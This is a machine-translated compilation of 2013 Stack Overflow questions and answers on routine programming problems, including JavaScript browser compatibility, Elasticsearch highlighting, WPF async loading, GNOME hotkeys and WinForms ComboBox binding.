刚看到这个问题。如果您仍然没有解决它，或者为了其他用户的利益，这里是我的解决方案。我有一个类似的问题，它是由通过 AJAX 加载的页面的某些部分引起的，并且每个页面都有自己的视图状态字段，这些字段与主页的视图状态字段冲突。我通过从 Ajax 页面中完全删除视图状态字段来解决它。这是我的做法：

[http://www.aspsnippets.com/Articles/How-to-disable-or-remove-ViewState-Hidden-Field-in-ASP.Net-Page.aspx](http://www.aspsnippets.com/Articles/How-to-disable-or-remove-ViewState-Hidden-Field-in-ASP.Net-Page.aspx)

# javascript - entity.childNodes(0) is not working in mozila

> ID：14379137
> 
> 赞同：0
> 
> 时间：2013-01-17T12:28:48.503
> 
> 标签：javascript, internet-explorer, mozilla

```
function expand(entity) {
    var oImage

    oImage = entity.childNodes(0).all["image"]

    oImage.src = entity.imageOpen

    if (typeof(entity.imageOpen) == "undefined")
        oImage.src = "<%=request.getContextPath()%>/images/MinusSignBlackSilver.gif";

    for(i=0; i < entity.childNodes.length; i++) {
        if(entity.childNodes(i).tagName == "DIV") {
            entity.childNodes(i).style.display = "block"
        }
    }
    entity.open = "true"
} 
```

is working fine on IE. But in Mozilla gives error entity.childNodes is not a function. What is the right syntax to work properly in IE and Mozilla?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:33:33.183

`childNodes`是一个类似数组的对象。尝试`entity.childNodes[0]`代替`(0)`.

此外`.all`，它是 IE 特定的功能，不是规范的一部分。您应该将其替换为任`querySelectorAll`一或其他（向后兼容）功能。

**参考**： [https ://developer.mozilla.org/pl/docs/DOM/element.childNodes](https://developer.mozilla.org/pl/docs/DOM/element.childNodes)

# javascript - 文件上传有时无法在 IE9 上运行

> ID：14379138
> 
> 赞同：4
> 
> 时间：2013-01-17T12:28:50.570
> 
> 标签：javascript, asp.net, html, ajax, file-upload

我正在使用 valums ajax-upload 和 ashx 处理程序，让用户在我正在开发的 webapp 中上传文件。对于大约 95%（约 3000）的用户来说，一切都运行良好。

对于最后大约 5%，我收到报告说上传永远不会完成，人们说轮子一直在旋转。出现这个错误的人似乎都在使用IE9.0。

我已经在所有可以遇到的 IE9.0 上进行了测试，但仍然无法重现该错误。我也尝试记录所有可以想到的错误，但仍然没有运气。

拜托，谁能重现这个问题，如果有的话，希望能给我一个 JavaScript 控制台错误记录。要进行测试，请转到第 2 步（上传部分）并尝试上传一个小文本文件：

[https://jobmatchprofile.com/backend/login.aspx?auto_login=24G3FY](https://jobmatchprofile.com/backend/login.aspx?auto_login=24G3FY)

**更新**

我一直在与遇到此问题的用户联系。可以在此处看到错误消息。它用丹麦语写着：“SCRIPT5 访问被拒绝”。

错误信息![在此处输入图像描述](../Images/b69681418dc19cd3157d24f32c90e75d.png)

奇怪的是，用户的 IE 版本与为其他人工作的相同（例如我）：我一直在测试：9.0.8112.16421 并且还运行了 WIN7（和我一样）。然而，产品 ID 不同，他有一个丹麦版本，而我有美国版本。

**更新二**

我终于能够重现这个错误。我知道这听起来有点奇怪，但相信我这是真的：通过发送到我的 gmail 帐户的链接打开页面时，我得到了同样的错误。第一次**更新**的用户也使用 gmail 打开页面。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-22T19:42:32.970

您对 Gmail 的引用特别指出了解决方案的方向：当您单击电子邮件中的链接时，Gmail 会从 HTTP 标头中删除引荐来源数据，除非您使用鼠标右键并选择“以新方式打开” Tab [or Window]”，大概是因为这可以防止他们的代码拦截标题。您的脚本是否有机会检查有效的 HTTP REFERRER？

* * *

您是否在进行任何跨（子）域或跨协议 AJAX 调用？如果是这样，那么您可能必须代理请求。考虑来自 Yahoo! 的以下解决方案 开发者网络：http: [//developer.yahoo.com/javascript/howto-proxy.html](http://developer.yahoo.com/javascript/howto-proxy.html)

也可以看看：

*   [SCRIPT5：在 IE9 中对 xmlhttprequest 的访问被拒绝](https://stackoverflow.com/questions/5793831/script5-access-is-denied-in-ie9-on-xmlhttprequest)
*   [拒绝访问 IE 上的 jQuery 脚本](https://stackoverflow.com/questions/5087549/access-denied-to-jquery-script-on-ie)
*   [尝试访问以编程方式创建的 <iframe> 的文档对象时出现“访问被拒绝”JavaScript 错误（仅限 IE）](https://stackoverflow.com/questions/1886547/access-is-denied-javascript-error-when-trying-to-access-the-document-object-of)

（不）幸运的是，我无法在 IE9，v. 9.0.8112.16421 中重现该错误（尽管我在尝试上传空的 .txt 文件时确实遇到了一般的现场错误，但这似乎完全不相关）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T21:07:17.540

即使您确定它与用户单击电子邮件中的锚点有关，我也会说这是因为 Internet Explorer 中的策略设置。我以前见过类似的错误，并注意到最常见的错误与公司环境中用户的 Internet Explorer 策略有关。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-24T00:20:12.887

ie9 的解决方案是简单地使用上传`https`：

[https://www.parse.com/questions/internet-explorer-and-the-javascript-sdk](https://www.parse.com/questions/internet-explorer-and-the-javascript-sdk)

# apache - Apache Errors, What do they mean?

> ID：14379140
> 
> 赞同：0
> 
> 时间：2013-01-17T12:28:57.200
> 
> 标签：apache

i am getting these error messages in my apache log but i have no idea what they mean. any ideas?

```
[Thu Jan 10 17:50:20 2013] [warn] Cannot get media type from 'x-mapp-php5'
[Thu Jan 10 17:50:20 2013] [warn] Cannot get media type from 'x-mapp-php5'
[Thu Jan 10 17:50:20 2013] [warn] Cannot get media type from 'x-mapp-php5'
[Thu Jan 10 17:50:20 2013] [error] [client 66.249.78.171] [info] [pid=23974 euid=0 egid=99] suexec.cpp(280): setrlimit(2): 9 set to  33554432/33554432 (soft/hard) bytes
[Thu Jan 10 17:50:20 2013] [error] [client 66.249.78.171] [info] [pid=23974 euid=0 egid=99] suexec.cpp(280): setrlimit(2): 2 set to  4294967295/4294967295 (soft/hard) bytes
[Thu Jan 10 17:50:20 2013] [error] [client 66.249.78.171] [info] [pid=23974 euid=0 egid=99] suexec.cpp(280): setrlimit(2): 3 set to  4294967295/4294967295 (soft/hard) bytes
[Thu Jan 10 17:50:20 2013] [error] [client 66.249.78.171] [info] [pid=23974 euid=0 egid=99] suexec.cpp(280): setrlimit(2): 9 set to  176160768/176160768 (soft/hard) bytes
[Thu Jan 10 17:50:20 2013] [error] [client 66.249.78.171] [info] [pid=23974 euid=0 egid=99] suexec.cpp(280): setrlimit(2): 2 set to  4294967295/4294967295 (soft/hard) bytes
[Thu Jan 10 17:50:20 2013] [error] [client 66.249.78.171] [info] [pid=23974 euid=0 egid=99] suexec.cpp(280): setrlimit(2): 3 set to  4294967295/4294967295 (soft/hard) bytes` 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T14:02:56.937

`Cannot get media type from 'x-mapp-php5'`

您的 php 设置有问题（如果您收到该消息，php 文件可能无法正常工作）。x-mapp-php5 很可能在您的 Apache 配置中映射到“.php”，因此当服务器尝试提供 php 文件时，它正在寻找处理 x-mapp-php5 的东西，但由于一些配置错误而没有找到它.

`[error] [client 66.249.78.171] [info] [pid=23974 euid=0 egid=99] suexec.cpp(280): setrlimit(2): 9 set to 33554432/33554432 (soft/hard) bytes`

pid、euid 和 egid 是进程 ID、用户 ID 和组 ID。suexec.cpp 表示某些东西正试图将用户标识更改为 root (euid=0)。setrlimit 表示尝试设置系统资源限制。

换句话说，您的 Apache 设置中的某些东西正试图在系统级别上做一些它不能/不应该做的事情。

# javascript - 通过 jQuery 获取窗口高度

> ID：14379143
> 
> 赞同：2
> 
> 时间：2013-01-17T12:29:06.890
> 
> 标签：javascript, jquery, jquery-mobile

我在使用`$(window).height()`. 我第一次加载页面时显示为0，刷新后我才能得到正确的数字。

我试图将它放在`$(document).ready(function(){})`JavaScript 开头的`$('[data-role="page"]').live('pageshow', function () {})`（它是一个 jquery 移动网站）中，但没有任何效果。

如何在不刷新文件的情况下获取加载文件的窗​​口高度？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T12:31:17.257

尝试以下操作：

```
$(window).load(function(){ 
    console.log( $(this).height() )
}); 
```

但是窗口高度基本上总是一样的。您可能需要文档正文高度：

```
$(window).load(function(){ 
    console.log( $(document).height() )
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T12:33:11.287

好吧，您将一个空函数传递给`ready()`，这就是它不执行任何操作的原因。

您可以将此快捷方式用于`$(document).ready(handler)`：

```
$(function() {
  console.log($(window).height());
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T12:45:16.873

您的代码中的某处可能有错误。

```
$(window).height(); 
```

应该返回你的真实身高。

```
$('#index').live('pagebeforeshow',function(e,data){    
    alert($(window).height());
}); 
```

这是一个工作示例：http: [//jsfiddle.net/Gajotres/JmqX6/](http://jsfiddle.net/Gajotres/JmqX6/)

现在手机已经完全不同了，为了在手机上正常工作，你还需要在你的 HEAD 中添加一个 vireport 标签：

```
<meta name="viewport" content="target-densitydpi=device-dpi, width=device-width" /> 
```

# javascript - Having difficulty in finding the existence of a location inside an area on Google Maps

> ID：14379144
> 
> 赞同：0
> 
> 时间：2013-01-17T12:29:07.717
> 
> 标签：javascript, html, google-maps-api-3, dom-events

I have drawn a **polygon** on Google Maps. But I am unable to verify whether a point exists within that area. How can I achieve this? Any suggestion would be appreciated.

```
<!DOCTYPE html>
<html>
<head>
    <title>Polygon</title>
    <script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?key=my_API_key&sensor=false&libraries=geometry"></script>
    <script>
        var centerPoint = new google.maps.LatLng(22.65, 88.45);
        var centerPoint2 = new google.maps.LatLng(28.3, 86.3167);
        var centerPoint3 = new google.maps.LatLng(22.65, 88.45);
        var centerPoint4 = new google.maps.LatLng(20.6333, 84.3167);
        var centerPoint5 = new google.maps.LatLng(24.6333, 85.3167);
        function Initialize() {
            var mapProp = {
                center: centerPoint,
                zoom: 4,
                mapTypeId: google.maps.MapTypeId.HYBRID
            };
            var map = new google.maps.Map(document.getElementById("MyMap"), mapProp);
            var marker = new google.maps.Marker({
                                                  position: centerPoint,
                                                  animation: google.maps.Animation.BOUNCE
                                               });
    var myTrip = [centerPoint2, centerPoint3, centerPoint4];
    var flightPath = new google.maps.Polygon({
                        path: myTrip,
                        strokeColor: "#0000FF",
                        strokeOpacity: 0.2,
                        strokeWeight: 2,
                        fillColor: "#B0F0FF",
                        fillOpacity: 0.4,
                        editable: true
                        });
            marker.setMap(map);
    flightPath.setMap(map);
    var locationExists = new  google.maps.geometry.poly.containsLocation({
                                    point: centerPoint5,
                                    polygon: flightPath
                                });
    document.getElementById("MyData").innerHTML = locationExists;
         }
         google.maps.event.addDomListener(window, 'load', Initialize);
    </script>
</head>
<body>
    <div id="MyMap" style="height: 500px; width: 500px;"></div>
    <div id="MyData" style="height: 500px; width: 500px;"></div>
</body> 
```

Is the `containsLocation()` used properly? If not please suggest.

![enter image description here](../Images/f5b06b402d83cbfdb2379b1f6930ebc0.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T12:49:54.357

使用[google.maps.geometry.poly.containsLocation](https://developers.google.com/maps/documentation/javascript/reference#poly)

**注意：** geometry-library 默认不加载，必须使用 maps-api 的 library-parameter 加载

# search-engine - elasticsearch highlight property missing in results

> ID：14379145
> 
> 赞同：1
> 
> 时间：2013-01-17T12:29:10.603
> 
> 标签：search-engine, elasticsearch, highlighting

I have trouble getting elasticsearch results highlighting to work. I have found many examples and tried different versions but I fail applying it to my own index. What am I doing wrong?

Here is my test script:

```
init() {
    curl -XDELETE http://localhost:9200/twitter
    echo
    curl -XPUT http://localhost:9200/twitter
    echo

    curl -XPUT http://localhost:9200/twitter/tweet/_mapping -d '{
        "tweet" : {
            "properties" : {
                "user" : { "type" : "string" },
                "message" : {
                    "type" : "string",
                    "index": "analyzed",
                    "store": "yes",
                    "term_vector" : "with_positions_offsets"
                 }
            }
        }
    }'
    echo
    curl -XPOST http://localhost:9200/twitter/tweet -d '{
        "user": "kimchy",
        "message": "You know, for Search"
    }'
    echo
    curl -XPOST http://localhost:9200/twitter/tweet -d '{
        "user": "bar",
        "message": "You know, foo for Search"
    }'
    echo

    sleep 2
    echo '-------------------'
}

[ "$1" = "init" ] && init

curl -X GET 'http://localhost:9200/twitter/_search/?pretty=true' -d '{
    "query":{
            "query_string":{
                "query":"foo"
            }
        }
    },
    "highlight":{
        "pre_tags": "<b>",
        "post_tags": "</b>",
        "fields" : {
            "message" : {"number_of_fragments": 20}
        }
    }
}' 
```

and here the output:

```
{
  "took" : 4,
  "timed_out" : false,
  "_shards" : {
    "total" : 5,
    "successful" : 5,
    "failed" : 0
  },
  "hits" : {
    "total" : 1,
    "max_score" : 0.09492774,
    "hits" : [ {
      "_index" : "twitter",
      "_type" : "tweet",
      "_id" : "1tgGWGhnRLy-nJIAunFeeQ",
      "_score" : 0.09492774, "_source" : {
        "user": "bar",
        "message": "You know, foo for Search"
    }
    } ]
  }
}% 
```

As you can see the highlight property is missing completely.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T12:54:42.923

您的查询部分中有太多右大括号：

```
"query":{
        "query_string":{
            "query":"foo"
        }
    } <---- This one is not needed.
}, 
```

所以高亮部分被解析器简单地忽略了。

顺便说一句，`pre_tags`and`post_tags`应该是数组：

```
curl "localhost:9200/twitter/tweet/_search?pretty=true" -d '{
    "query": {
        "query_string": {
            "query": "foo"
        }
    },
    "highlight": {
        "pre_tags": ["<b>"],
        "post_tags": ["</b>"],
        "fields": {
            "message": {"number_of_fragments": 20}
        }
    }    
}' 
```

# c++ - How to init simple pod * as array in C++11?

> ID：14379152
> 
> 赞同：-2
> 
> 时间：2013-01-17T12:29:22.223
> 
> 标签：c++, c++11

I personaly have a problem with float, tried:

```
auto p = new float*({$X, $Y, $Z}); 
```

`$X, $Y, $Z` local variables. What do I do wrong?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:59:03.850

作为避免显式动态分配和释放的替代方法，使用[`std::vector<float>`](http://en.cppreference.com/w/cpp/container/vector)带有初始化语法的 a：

```
std::vector<float> p{ X, Y, Z}; 
```

如果您需要访问底层数组，您可以通过[`std::vector::data()`](http://en.cppreference.com/w/cpp/container/vector/data).

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T12:34:23.260

语法与旧的 pre-C++11 标准相同，混合了新的统一初始化语法：

```
auto p = new float[3]{X, Y, Z}; 
```

# wpf - WPF with UI threading issues - TaskFactory, CollectionView issues - syntax nightmare

> ID：14379158
> 
> 赞同：2
> 
> 时间：2013-01-17T12:29:33.963
> 
> 标签：wpf, multithreading, task-parallel-library, async-await, collectionview

See bottom of post for my pseudo solution.

Once again I'm completely and utterly stuck on this. I've burned hours trying to understand - and yes I can get a single collectionviewsource to work beautifully with nothing about threading on the code behind.

Imagine my shock when I found merely adding two collectionviewsources on the page causes threading issues. I've spent a few hours last night reading Async in C#5 and the MSDN stuff however I get into work today and I can't decipher how to make this happen.

The code below is the last attempt I've made before whining for help as I've burnt, possibly, a bit too much work time on attempting to understand how to do this. I understand that I need one collectionviewsource to complete before starting the other, so I tried Await Task.ContinueWith etc to try and chain one after the other.

Lining up both sets of tasks in the threads correctly seems to be quite tricky, or I'm still misunderstanding something fundemental.

If anyone can advise how they would asynchronously populate a few controls on a WPF UI I would be very grateful.

The application itself is a throwaway application, linked to an Access database that I'm using to try and become fluent enough in threading to implement it in our proper code base. I'm long way off that!

Updated with more complete code samples and the adjustments made according to answers:

```
Private Async Sub MainWindowLoaded(sender As Object, e As RoutedEventArgs) Handles MyBase.Loaded
InitializeComponent()

Dim personSetViewSource As System.Windows.Data.CollectionViewSource = CType(Me.FindResource("personSetViewSource"), System.Windows.Data.CollectionViewSource)
Dim contactSetViewSource As System.Windows.Data.CollectionViewSource = CType(Me.FindResource("contactSetViewSource"), System.Windows.Data.CollectionViewSource)

Dim personList = Await Task.Run(Function() personSet.personList)
personSetViewSource.Source = personList

Dim contactList = Await Task.Run(Function() contactSet.contactList)
contactSetViewSource.Source = contactList

End Sub` 
```

The ObservableCollectionEx class:

```
public class ObservableCollectionEx<T> : ObservableCollection<T>
{
public override event NotifyCollectionChangedEventHandler CollectionChanged;

protected override void OnCollectionChanged(NotifyCollectionChangedEventArgs e)
{
    using (BlockReentrancy())
    {
        NotifyCollectionChangedEventHandler collectionChanged = this.CollectionChanged;
        if (collectionChanged != null)
            foreach (NotifyCollectionChangedEventHandler nh in collectionChanged.GetInvocationList())
            {
                DispatcherObject dispObj = nh.Target as DispatcherObject;
                if (dispObj != null)
                {
                    Dispatcher dispatcher = dispObj.Dispatcher;
                    if (dispatcher != null && !dispatcher.CheckAccess())
                    {
                        NotifyCollectionChangedEventHandler nh1 = nh;
                        dispatcher.BeginInvoke(
                            (Action) (() => nh1.Invoke(this,
                                                       new NotifyCollectionChangedEventArgs(
                                                           NotifyCollectionChangedAction.Reset))),
                            DispatcherPriority.DataBind);
                        continue;
                    }
                }
                nh.Invoke(this, e);
            }
    }
}
} 
```

Please note, I can't translate this class to VB due to requiring an Event Override. Another variation I've tried, but falls foul of thread ownership again. The two collectionviews thing isn't yielding to a solution: I don't know if it's because the underlying collection isn't good for it or whether in reality it wasn't meant to work that way. I get close but no cigar.

```
 Dim CarePlanList = Task.Run(Function() CarePlanSet.CarePlanList)
    Dim rcpdList = Task.Run(Function() rcpdSet.rcpdList)

    Dim tasks() As Task = {CarePlanList, rcpdList}
    Dim t = New TaskFactory
    Await t.ContinueWhenAll(tasks, Sub()
                                       carePlanSetViewSource.Source = CarePlanList
                                       rcpdSetViewSource.Source = rcpdList
                                   End Sub) 
```

I found a way to do it, based on a combination of feedback and research this morning. Building the two collectionviews asynchronously itself is somewhat impractical given the STAThread model of WPF. However, merely ensuring one HAS completed and shifting some of the async out of one entity class has made this plausible.

Instead I fire off the first task, who's underlying class does build it's data with its own Async method. Then test to see if it has completed before allowing the second collectionview to be fired off. This way I don't need to worry about context or dispatcherobjects. The second collection does not use any async.

```
 Dim personList = Task(Of List(Of person)).Run(Function() personSet.personList)
    Dim contactList = Task(Of ObservableCollectionEx(Of contact)).Run(Function() contactSet.contactList)

    contactSetViewSource.Source = contactList.Result
    If contactList.IsCompleted Then personSetViewSource.Source = personList.Result 
```

This is an experimental project for concept research really. As it happens, the idea I'd want two such lists built this way isn't as useful as all that but I do see where being able to compose a data heavy interface asynchronously could be handy.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T15:34:35.213

您的两个代码示例都存在立即跳出的问题。

在您正在等待的第一个中`task1`，我假设后面有更多代码，但`task1`所做的只是启动基本上是触发并忘记操作返回 UI 线程 ( `Dispatcher.BeginInvoke`)，因此不会真正产生任何异步等待。

其次，主要问题似乎是您正在进行大量`Task`实例设置并将它们与延续链接，但从未启动`action2 Task`，这似乎是整个链的根，因此根本没有任何活动。这类似于你得到的`BackgroundWorker`从未`RunWorkerAsync`调用过的结果。

为了让它正常工作并避免让你头晕目眩，我建议首先编写整个块而不进行任何异步并验证所有内容是否按预期加载，但要避免 UI 锁定。Async/Await 旨在以最小的结构更改添加到类似的代码中。与 async 和 await 一起使用`Task.Run`，您可以使代码异步。

这是基本模式的一些伪代码，没有异步启动：

```
PersonSetList = LoadData1()
CVS1.Source = PersonSetList
ContactList = LoadData2()
CVS2.Source = ContactList 
```

现在添加异步：

```
PersonSetList = await Task.Run(LoadData1())
CVS1.Source = PersonSetList
ContactList = await Task.Run(LoadData2())
CVS2.Source = ContactList 
```

这现在要做的是启动一个任务来加载人员数据并立即从您的 WindowLoaded 方法返回，允许 UI 继续呈现。加载该数据后，它将继续到*原始线程*的下一行并将数据推送到 UI（这本身可能会在渲染时减慢 UI）。之后，它将对联系人数据执行相同的操作。请注意，不需要 Dispatcher，因为 await 正在返回 UI 线程以供您完成其继续。

# javascript - 为任何页面创建按钮单击处理程序

> ID：14379161
> 
> 赞同：1
> 
> 时间：2013-01-17T12:29:49.367
> 
> 标签：javascript, google-chrome, javascript-events, google-chrome-extension

我正在尝试制作 Chrome 扩展程序。我的目标是做到以下几点：

1.  在单击具有特定 ID 的按钮或链接时运行某个 javascript。
2.  该按钮或带有特定 ID 的链接可以在任何网站上。

我的代码看起来很简单，但我不确定我错过了哪里。jquery 不会在 chrome 扩展中以这种方式工作吗？纯javascript中是否有任何等效代码？

清单.json

```
{
  "name": "Handle a button click",
  "version": "1.1",
  "background": { "scripts": ["background.js"] },
  "permissions": [
    "tabs"
  ],
  "browser_action": {
      "name": "click to handle"
  },
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["jquery-1.9.0.min.js"]
    }
  ],
  "manifest_version": 2
} 
```

背景.js

```
$(document).ready(function(){
    $("#my_submit").click(function(){
        alert("yo");
    });
} 
```

谢谢你

**更新** background.js 调试后我看到“未捕获的 ReferenceError：$ 未定义”，jQuery 文件没有被包含？或者为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:36:19.330

尝试这个：

```
$(document).ready(function(){
  $(document).click(function(event){
    if(event.target.id == "my_submit"){    
        alert("yo");
    }
    });
}); 
```

如果触发点击事件的元素具有 id `my_submit`，这将检查所有点击事件，如果是，则提醒

[jsfiddle](http://jsfiddle.net/gnvvQ/)

# ubuntu - Gsettigs 和 dconf 设置热键

> ID：14379164
> 
> 赞同：3
> 
> 时间：2013-01-17T12:29:55.033
> 
> 标签：ubuntu, global-hotkey

您好
，我需要在 ubuntu 12.10 中设置一个热键，我使用

gsettings(dconf)

```
~$ gsettings set org.gnome.settings-daemon.plugins.media-keys.custom-keybinding:/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom2/ binding '<Primary><Alt>s'
~$ gsettings set org.gnome.settings-daemon.plugins.media-keys.custom-keybinding:/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom2/ binding '<Primary><Alt>s'
~$ gsettings set org.gnome.settings-daemon.plugins.media-keys.custom-keybinding:/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom2/ command 'gnome-terminal' 
```

但是当我看这个模式时，我只看到

```
~$ gsettings get org.gnome.settings-daemon.plugins.media-keys custom-keybindings
~$ @as [] 
```

但是当我使用 dconf 查看此架构时

```
~$ dconf list /org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom2/
binding
command 
```

我做错了什么？谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-11T21:02:55.413

您忘记设置父键的值：`custom-keybindings`类型为`@as[]`. 首先检查它是否为空：

```
gsettings get org.gnome.settings-daemon.plugins.media-keys custom-keybindings 
```

如果它是空的：`[]`，运行：

```
gsettings set org.gnome.settings-daemon.plugins.media-keys custom-keybindings "['/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom2/']" 
```

如果它不为空，则必须将现有值添加到上述命令中（值必须用单引号括起来并用逗号 + 空格分隔，例如`['val1', 'val2', 'val3']`）。然后运行：

```
gsettings set org.gnome.settings-daemon.plugins.media-keys.custom-keybinding:/custom2/ binding '<Primary><Alt>s'
gsettings set org.gnome.settings-daemon.plugins.media-keys.custom-keybinding:/custom2/ command 'gnome-terminal' 
```

# visual-studio-2008 - 视觉工作室 2008 MFC 错误

> ID：14379167
> 
> 赞同：0
> 
> 时间：2013-01-17T12:30:14.093
> 
> 标签：visual-studio-2008

我创建了一个 MFC 对话框，我为它添加了一个类，现在，每次我尝试为该对话框的控件添加一个变量时，我都会收到以下错误消息：`Unable to update class constructor`. 我尝试过删除`*.suo`文件，构建/重建/清理，甚至删除对话框类的`.h` 和`.cpp`文件并再次添加该类，错误仍然存​​在。

有谁知道为什么会发生这种情况？

在 Windows 上使用 VS2008 SP1。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T12:55:03.607

我删除了`.nbc`and `.clw`，重新打开了我的解决方案，现在可以正常工作了。

# jsfiddle - 如何关闭 jsFiddle 快捷键键盘？

> ID：14379169
> 
> 赞同：2
> 
> 时间：2013-01-17T12:30:18.647
> 
> 标签：jsfiddle

如何在 jsFiddle 快捷键键盘中关闭？因为我有一个小问题......当我在任何面板上书写并且我使用波兰语字符时，它会启动一个键盘快捷键，所以我不能写波兰语字符，这很烦人：/

# ios - 通知中心 - 你能替换子弹图标吗？

> ID：14379174
> 
> 赞同：0
> 
> 时间：2013-01-17T12:30:33.857
> 
> 标签：ios, objective-c, notifications

我正在尝试为我的应用替换通知中心的蓝色子弹图标。

我认为这`alertLaunchImage`将允许我这样做。我试过做类似的事情

```
not.alertLaunchImage = @"customBullet"; 
```

但它保留默认的蓝色项目符号。子弹是可定制的吗？

更新

在下面的屏幕截图中，我正在尝试自定义左侧的蓝色项目符号。我已经知道如何自定义主图像（在本例中为 gmail 图标）

![在此处输入图像描述](../Images/8ae414b11fd5a57026d7fcdbd4619f40.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T12:46:39.010

没有。它只是意味着“新消息”，它由系统管理，而不是应用程序。

# xml - 将xml图像导入R

> ID：14379178
> 
> 赞同：1
> 
> 时间：2013-01-17T12:30:58.983
> 
> 标签：xml, image, r, web-scraping

我想导入这样的图像[，](http://pulse.blogs.yandex.net/?size=small&charset=utf8&period=20120116-20130116&query0=%D0%BF%D1%83%D1%82%D0%B8%D0%BD) 以便我可以在图像上绘制另一个图表，如此[处](https://stackoverflow.com/questions/9484631/set-reference-points-for-overlaying-data-onto-an-image-in-r) 和[此处](https://stackoverflow.com/questions/4993189/overlay-data-onto-background-image-in-r)所述。

我遇到的问题是图形不是具有固定 url 的图形对象，而是由代码创建的。我不太了解图像背后的代码，但无法使用 RCurl 和 XML 重新创建它。

我看到两个可能的选择：使用 R 启动浏览器并将图像另存为或正确处理代码，我想像这样

```
URL<-"http://
test<-htmlParese(getURL(url))
xpathSApply( 
```

有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:05:23.450

您要抓取的图像的链接不是“xml 图像”。它只是一个 .png 文件。因此，只需将图像保存到文件中，将其加载到 R 中，然后将其放在绘图上即可。像这样的东西会让你到达那里，但你需要稍微玩一下让它变得漂亮。

```
library(png)
# use the URL from your post, or construct on-the-fly
url = "http://pulse.blogs.yandex.net/?size=small&charset=utf8&period=20120116-20130116&query0=%D0%BF%D1%83%D1%82%D0%B8%D0%BD"
download.file(url,destfile='/tmp/test.png',mode='wb')
xvals=rnorm(10)
yvals=rnorm(10)
# just set up an "empty" plot
plot(xvals,yvals,type='n')
r = readPNG('/tmp/test.png')
# read the help for rasterImage for details
rasterImage(r,-1,-1,1,1)
# plot the points over the image
points(xvals,yvals) 
```

# c# - ComboBox.SelectedValue 抛出空引用异常

> ID：14379183
> 
> 赞同：1
> 
> 时间：2013-01-17T12:31:22.663
> 
> 标签：c#, .net, winforms

我整理了以下代码来演示我遇到的问题。

它是一个只有一个组合框的表单，它使用加载方法中从 LINQ 生成的数组填充。

它设置了 DisplayMember 和 ValueMember。显示成员按预期工作 - 它显示数字列表。但是，正如评论的那样， SelectedValue 为空。

```
private void Form1_Load(object sender, EventArgs e)
{
    comboBox1.DisplayMember = "Number";
    comboBox1.ValueMember = "Square";

    var it = from n in new int[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
             select new NumberAndSquare(n);
    comboBox1.Items.AddRange(it.ToArray());
}

private void comboBox1_SelectionChangeCommitted(object sender, EventArgs e)
{
    ComboBox combo = sender as ComboBox;
    MessageBox.Show(combo.SelectedItem.ToString());  //works as expected
    MessageBox.Show(combo.SelectedValue.ToString()); //throws null reference exception
}

class NumberAndSquare
{
    public NumberAndSquare(int number)
    {
        Number = number;
    }

    public int Number
    { get; set; }
    public int Square
    {
        get
        {
            return Number*Number;
        }
    }

    public override String ToString()
    {
        return string.Format("{0}: {1}", Number, Square);
    }
} 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T12:40:55.243

`SelectedValue`在这种情况下毫无疑问`null`，因为没有任何东西被*绑定*。AFAIK `DataMember`/`ValueMember`属性仅在您将 a 绑定`DataSource`到您的组合框（您不是）时使用。例如，如果您将代码更改为：

```
var it = from n in new int[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
         select new NumberAndSquare(n);
comboBox1.DataSource = it.ToList();
comboBox1.DisplayMember = "Number";
comboBox1.ValueMember = "Square"; 
```

它应该工作

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T12:43:25.290

尝试这个：

```
comboBox1.DataSource = it.ToList(); 
```

按照这个链接：http: [//msdn.microsoft.com/en-us/library/system.windows.forms.listcontrol.selectedvalue.aspx](http://msdn.microsoft.com/en-us/library/system.windows.forms.listcontrol.selectedvalue.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-11-06T10:22:01.807

试试这个解决方案。它解决了我同样的问题。

selectedvalue 属性是对象数据类型。但是如果您将 List 与类或 KeyValuePair 一起使用，则必须转换数据类型，然后为其分配 selectedvalue 属性。

```
private void dogrulamaDoldur()
    {
        List<KeyValuePair<int, string>> l = new List<KeyValuePair<int, string>>();
        l.Add(new KeyValuePair<int, string>(0, "Parmak İzi, Şifre veya Kart"));
        l.Add(new KeyValuePair<int, string>(1, "Parmak İzi"));
        l.Add(new KeyValuePair<int, string>(2, "PIN"));
        l.Add(new KeyValuePair<int, string>(3, "Şifre"));
        l.Add(new KeyValuePair<int, string>(4, "Kart"));
        l.Add(new KeyValuePair<int, string>(5, "Parmak İzi veya Şifre"));
        l.Add(new KeyValuePair<int, string>(6, "Pamak İzi veya Kart"));
        l.Add(new KeyValuePair<int, string>(7, "Şifre veya Kart"));
        l.Add(new KeyValuePair<int, string>(8, "PIN ve Parmak İzi"));
        l.Add(new KeyValuePair<int, string>(9, "Parmak izi ve Şifre"));
